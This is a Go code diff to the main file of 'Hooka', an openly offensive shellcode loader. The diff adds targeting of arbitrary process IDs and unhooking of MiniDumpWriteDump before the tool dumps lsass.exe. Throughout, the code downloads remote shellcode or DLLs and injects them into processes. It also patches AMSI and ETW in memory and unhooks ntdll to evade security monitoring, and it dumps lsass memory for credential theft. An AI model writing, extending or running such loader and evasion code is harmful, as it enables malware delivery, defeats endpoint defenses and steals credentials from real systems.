@@ -8,10 +8,8 @@ import (
   "encoding/hex"
   "encoding/base64"
 
-  // Hooka
-  "github.com/D3Ext/Hooka/core"
+  "github.com/D3Ext/Hooka/pkg/hooka"
 
-  // My own malware dev package
   l "github.com/D3Ext/maldev/logging"
 )
 
@@ -19,14 +17,19 @@ func main() {
   var shellcode []byte
   var err error
 
-  // Parse CLI flags and retrieve values
-  sc_url, sc_file, dll_file, dll_url, technique, hook_detect, halos, unhook, base64_flag, hex_flag, test_flag, amsi, etw, lsass := core.ParseFlags()
+  err = hooka.AutoCheck()
+  if err != nil {
+    l.Fatal(err)
+  }
 
-  l.PrintBanner("Hooka!") // Print script banner with version
+  // Parse CLI flags and retrieve values
+  sc_url, sc_file, dll_file, dll_url, technique, hook_detect, halos, unhook, base64_flag, hex_flag, test_flag, amsi, etw, lsass, pid := hooka.ParseFlags()
+
+  l.PrintBanner("Hooka!")
   l.Println(" by D3Ext - v0.1")
   time.Sleep(100 * time.Millisecond)
 
-  if (sc_url == "") && (sc_file == "") && (dll_file == "") && (dll_url == "") && (!hook_detect) && (!test_flag) && (lsass == "") { // Enter here if any main flag was especified
+  if (sc_url == "") && (sc_file == "") && (dll_file == "") && (dll_url == "") && (!hook_detect) && (!test_flag) && (lsass == "") {
     l.Println()
     flag.PrintDefaults()
     l.Println("\n[-] Parameters missing")
@@ -65,13 +68,6 @@ func main() {
 
   } else if (sc_url != "") && (sc_file == "") && (dll_file == "") && (dll_url == "") {
 
-    if (technique != "CreateRemoteThread") && (technique != "CreateProcess") && (technique != "QueueApcThread") && (technique != "UuidFromString") && (technique != "Fibers") && (technique != "") {
-      l.Println()
-      flag.PrintDefaults()
-      l.Println("\n[-] Unknown injection technique! See help panel\n")
-      os.Exit(0)
-    }
-
     if (base64_flag) && (hex_flag) { // Check if both flags were passed
       l.Println()
       flag.PrintDefaults()
@@ -86,7 +82,13 @@ func main() {
 
     time.Sleep(200 * time.Millisecond)
     l.Println("\n[+] Remote shellcode URL: " + sc_url)
-    time.Sleep(300 * time.Millisecond)
+    time.Sleep(200 * time.Millisecond)
+    if (pid != 0 ){
+      l.Println("[+] Target PID:", pid)
+    } else {
+      l.Println("[+] Target PID: self")
+    }
+    time.Sleep(200 * time.Millisecond)
 
     if (!base64_flag) && (!hex_flag) { // Check shellcode encoding flags
       l.Println("[+] No encoding was especified")
@@ -98,7 +100,7 @@ func main() {
     time.Sleep(300 * time.Millisecond)
 
     l.Println("[*] Retrieving shellcode from url...")
-    shellcode, err = core.GetShellcodeFromUrl(sc_url)
+    shellcode, err = hooka.GetShellcodeFromUrl(sc_url)
     if err != nil { // Handle error
       l.Println("[-] An error has ocurred retrieving shellcode!")
       l.Fatal(err)
@@ -130,17 +132,17 @@ func main() {
 
     time.Sleep(300 * time.Millisecond)
     if (technique != "") {
-      l.Println("[*] Injecting shellcode using " + technique + " function")
+      l.Println("[*] Injecting shellcode using " + technique + " technique")
     }
 
     if (halos) { // Check if --halos flag was used
-      err := core.InjectHalos(shellcode, technique)
+      err := hooka.InjectHalos(shellcode, technique, pid)
       if err != nil {
         l.Fatal(err)
       }
 
     } else {
-      err = core.Inject(shellcode, technique) // Inject shellcode w/o halo's gate
+      err = hooka.Inject(shellcode, technique, pid) // Inject shellcode w/o halo's gate
       if err != nil { // Handle error
         l.Fatal(err)
       }
@@ -166,12 +168,18 @@ func main() {
     }
 
     time.Sleep(200 * time.Millisecond) // Add some delay to let the user read info
+    if (pid != 0 ){
+      l.Println("\n[+] Target PID:", pid)
+    } else {
+      l.Println("\n[+] Target PID: self")
+    }
+    time.Sleep(200 * time.Millisecond)
     l.Println("\n[+] Shellcode file: " + sc_file)
     time.Sleep(300 * time.Millisecond)
     l.Println("[*] Getting shellcode from file...")
     time.Sleep(300 * time.Millisecond)
 
-    shellcode, err = core.GetShellcodeFromFile(sc_file) // Read file and retrieve shellcode as bytes
+    shellcode, err = hooka.GetShellcodeFromFile(sc_file) // Read file and retrieve shellcode as bytes
     if err != nil { // Handle error
       l.Fatal(err)
     }
@@ -215,13 +223,13 @@ func main() {
     }
 
     if (halos) { // Check if --halos flag was used
-      err := core.InjectHalos(shellcode, technique)
+      err := hooka.InjectHalos(shellcode, technique, pid)
       if err != nil {
         l.Fatal(err)
       }
 
     } else {
-      err = core.Inject(shellcode, technique) // Inject shellcode w/o halo's gate
+      err = hooka.Inject(shellcode, technique, pid) // Inject shellcode w/o halo's gate
       if err != nil { // Handle error
         l.Fatal(err)
       }
@@ -257,8 +265,13 @@ func main() {
       os.Exit(0)
     }
 
+    if (pid != 0 ){
+      l.Println("\n[+] Target PID:", pid)
+    } else {
+      l.Println("\n[+] Target PID: self")
+    }
     time.Sleep(200 * time.Millisecond) // Add some delay to let the user read info
-    l.Println("\n[+] DLL file: " + dll_filename)
+    l.Println("[+] DLL file: " + dll_filename)
     time.Sleep(300 * time.Millisecond)
     if (dll_func != "") {
       l.Println("[+] Function to execute: " + dll_func)
@@ -268,7 +281,7 @@ func main() {
     time.Sleep(300 * time.Millisecond)
 
     l.Println("[*] Converting " + dll_filename + " to shellcode")
-    shellcode, err := core.ConvertDllToShellcode(dll_filename, dll_func, "") // Convert DLL to shellcode
+    shellcode, err := hooka.ConvertDllToShellcode(dll_filename, dll_func, "") // Convert DLL to shellcode
     if err != nil { // Handle error
       l.Fatal(err)
     }
@@ -288,13 +301,13 @@ func main() {
     }
 
     if (halos) {
-      err = core.InjectHalos(shellcode, technique)
+      err = hooka.InjectHalos(shellcode, technique, pid)
       if err != nil {
         l.Fatal(err)
       }
 
     } else {
-      err = core.Inject(shellcode, technique) // Inject shellcode w/o halo's gate
+      err = hooka.Inject(shellcode, technique, pid) // Inject shellcode w/o halo's gate
       if err != nil { // Handle error
         l.Fatal(err)
       }
@@ -305,19 +318,33 @@ func main() {
 
   } else if (sc_url == "") && (sc_file == "") && (dll_file == "") && (dll_url != "") {
 
-    dll_func := strings.Split(dll_url, ",")[1]
-    dll_url := strings.Split(dll_url, ",")[0]
+    var dll_func string
+    var dll_url string
+
+    if len(strings.Split(dll_url, ",")) >= 2 {
+      dll_func = strings.Split(dll_url, ",")[1]
+      dll_url = strings.Split(dll_url, ",")[0]
+    } else {
+      dll_func = ""
+      dll_url = strings.Split(dll_url, ",")[0]
+    }
+
+    if (pid != 0 ){
+      l.Println("\n[+] Target PID:", pid)
+    } else {
+      l.Println("\n[+] Target PID: self")
+    }
 
     time.Sleep(200 * time.Millisecond)
     if (dll_func != "") {
-      l.Println("\n[+] Function to execute: " + dll_func)
+      l.Println("[+] Function to execute: " + dll_func)
     } else {
-      l.Println("\n[+] Function to execute: default")
+      l.Println("[+] Function to execute: default")
     }
     time.Sleep(300 * time.Millisecond)
 
     l.Println("[*] Retrieving DLL from url...")
-    dll_bytes, err := core.GetShellcodeFromUrl(dll_url)
+    dll_bytes, err := hooka.GetShellcodeFromUrl(dll_url)
     if err != nil { // Handle error
       l.Println("[-] An error has ocurred retrieving remote dll!")
       l.Fatal(err)
@@ -325,7 +352,7 @@ func main() {
     time.Sleep(300 * time.Millisecond)
     
     l.Println("[*] Converting raw bytes to shellcode")
-    shellcode, err := core.ConvertDllBytesToShellcode(dll_bytes, dll_func, "") // Convert DLL to shellcode
+    shellcode, err := hooka.ConvertDllBytesToShellcode(dll_bytes, dll_func, "") // Convert DLL to shellcode
     if err != nil { // Handle error
       l.Fatal(err)
     }
@@ -345,13 +372,13 @@ func main() {
     }
 
     if (halos) {
-      err = core.InjectHalos(shellcode, technique)
+      err = hooka.InjectHalos(shellcode, technique, pid)
       if err != nil {
         l.Fatal(err)
       }
 
     } else {
-      err = core.Inject(shellcode, technique) // Inject shellcode w/o halo's gate
+      err = hooka.Inject(shellcode, technique, pid) // Inject shellcode w/o halo's gate
       if err != nil { // Handle error
         l.Fatal(err)
       }
@@ -364,7 +391,7 @@ func main() {
 
     l.Println("\n[*] Detecting hooked functions...")
 
-    all_hooks, err := core.DetectHooks() // Get all hooked functions
+    all_hooks, err := hooka.DetectHooks() // Get all hooked functions
     if err != nil { // Handle error
       l.Fatal(err)
     }
@@ -400,16 +427,26 @@ func main() {
       l.Println("[*] Injecting shellcode using " + technique + " technique")
     }
 
-    err := core.Inject(core.CalcShellcode(), technique) // Inject calc.exe shellcode
+    err := hooka.Inject(hooka.CalcShellcode(), technique, pid) // Inject calc.exe shellcode
     if err != nil { // Handle error
       l.Fatal(err)
     }
     l.Println("[+] Shellcode should have been executed!\n")
 
   } else if (lsass != "") { // Enter here if --lsass flag was especified
-    l.Println("\n[*] Dumping lsass.exe process to " + lsass)
+
+    if (unhook != 0) {
+      l.Println("\n[*] Unhooking MiniDumpWriteDump from dbghelp32.dll")
+      time.Sleep(200 * time.Millisecond)
+      err := hooka.ClassicUnhook("MiniDumpWriteDump", "C:\\Windows\\System32\\Dbghelp.dll")
+      if err != nil {
+        l.Fatal(err)
+      }
+    }
+
+    l.Println("[*] Dumping lsass.exe process to " + lsass)
     
-    err := core.DumpLsass(lsass)
+    err := hooka.DumpLsass(lsass)
     if err != nil { // Handle error
       l.Println("[-] An error has ocurred, ensure to be running as admin:")
       e := os.Remove(lsass)
@@ -438,7 +475,7 @@ func checkAmsi(check bool) {
   if (check) {
     l.Println("[*] Patching AMSI by overwriting AmsiScanBuffer memory address...")
     time.Sleep(200 * time.Millisecond)
-    err := core.PatchAmsi()
+    err := hooka.PatchAmsi()
     if err != nil {
       l.Println("[-] An error has ocurred while overwriting memory!")
       l.Fatal(err)
@@ -451,7 +488,7 @@ func checkEtw(check bool) {
   if (check) {
     l.Println("[*] Patching ETW by overwriting some EtwEventWrite functions memory address...")
     time.Sleep(200 * time.Millisecond)
-    err := core.PatchEtw()
+    err := hooka.PatchEtw()
     if err != nil {
       l.Println("[-] An error has ocurred while overwriting memory!")
       l.Fatal(err)
@@ -465,7 +502,7 @@ func checkUnhook(unhook int, technique string) {
   if (unhook == 1) {
     l.Println("[*] Unhooking functions via Classic technique...")
     time.Sleep(200 * time.Millisecond)
-    err := core.ClassicUnhook(technique, "C:\\Windows\\System32\\ntdll.dll")
+    err := hooka.ClassicUnhook(technique, "C:\\Windows\\System32\\ntdll.dll")
     if err != nil {
       l.Println("[-] An error has ocurred while unhooking functions!")
       l.Fatal(err)
@@ -475,7 +512,7 @@ func checkUnhook(unhook int, technique string) {
   } else if (unhook == 2) {
     l.Println("[*] Unhooking functions via Full Dll technique...")
     time.Sleep(200 * time.Millisecond)
-    err := core.FullUnhook("C:\\Windows\\System32\\ntdll.dll")
+    err := hooka.FullUnhook("C:\\Windows\\System32\\ntdll.dll")
     if err != nil {
       l.Println("[-] An error has ocurred while unhooking functions!")
       l.Fatal(err)
@@ -485,7 +522,7 @@ func checkUnhook(unhook int, technique string) {
   } else if (unhook == 3) {
     l.Println("[*] Unhooking functions via Perun's Fart technique...")
     time.Sleep(200 * time.Millisecond)
-    err := core.PerunsUnhook()
+    err := hooka.PerunsUnhook()
     if err != nil {
       l.Println("[-] An error has ocurred while unhooking functions!")
       l.Fatal(err)
